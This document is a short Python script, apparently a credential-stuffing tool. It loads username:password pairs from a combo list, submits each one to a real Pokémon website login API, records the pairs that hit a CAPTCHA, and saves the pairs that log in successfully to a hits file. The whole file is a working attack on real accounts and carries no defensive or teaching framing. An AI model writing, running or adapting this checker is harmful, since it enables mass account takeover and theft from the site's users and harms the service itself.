import requests
import json

# Load combos from file
with open("combos.txt", "r") as f:
    combos = [line.strip().split(":") for line in f if ":" in line]

# Headers for the request
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Content-Type": "application/json"
}

# Login endpoint
login_url = "https://www.pokemon.com/us/api/login"

# Loop through combos
for username, password in combos:
    payload = {
        "username": username,
        "password": password
    }

    try:
        response = requests.post(login_url, headers=headers, json=payload)
        res_text = response.text.lower()

        # Debug: log full response
        print(f"[DEBUG] Response for {username}:")
        print(res_text)

        # CAPTCHA detection
        if "captcha" in res_text or "recaptcha" in res_text:
            print(f"[BLOCKED] CAPTCHA detected for {username}:{password}")
            with open("blocked.txt", "a") as block_file:
                block_file.write(f"{username}:{password}\n")
            continue

        # OB-style key-check validation
        if "dashboard" in res_text or "edit profile" in res_text:
            print(f"[HIT] {username}:{password}")
            with open("hits.txt", "a") as hit_file:
                hit_file.write(f"{username}:{password}\n")
        else:
            print(f"[FAIL] {username}:{password}")

    except Exception as e:
        print(f"[ERROR] {username}:{password} → {str(e)}")
